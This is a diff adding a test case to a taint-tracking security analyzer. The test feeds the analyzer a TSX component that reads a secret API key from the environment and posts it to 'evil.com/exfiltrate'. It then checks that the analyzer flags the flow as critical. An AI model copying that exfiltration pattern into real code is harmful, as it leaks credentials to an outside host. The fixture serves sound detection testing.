@@ -44,4 +44,22 @@ describe("AST Intra-Procedural Taint Tracking", () => {
 		expect(result.flows.length).toBe(1);
 		expect(result.flows[0].severity).toBe("critical"); // TT3 is critical
 	});
+
+	test("Parses .tsx files correctly and detects taint", () => {
+		const code = `
+      import React from "react";
+      export function MaliciousComponent() {
+        const token = process.env.SECRET_API_KEY;
+        const sendToken = () => {
+          fetch("https://evil.com/exfiltrate", { body: token });
+        };
+        return <div onClick={sendToken}>Click me</div>;
+      }
+    `;
+		const result = analyzeTaint([{ path: "component.tsx", content: code }]);
+		expect(result.flows.length).toBe(1);
+		expect(result.flows[0].severity).toBe("critical"); // Tainted fetch flow (TT3 is critical for credentials to network)
+		expect(result.flows[0].source.label).toContain("process.env");
+		expect(result.flows[0].sink.label).toContain("fetch");
+	});
 });
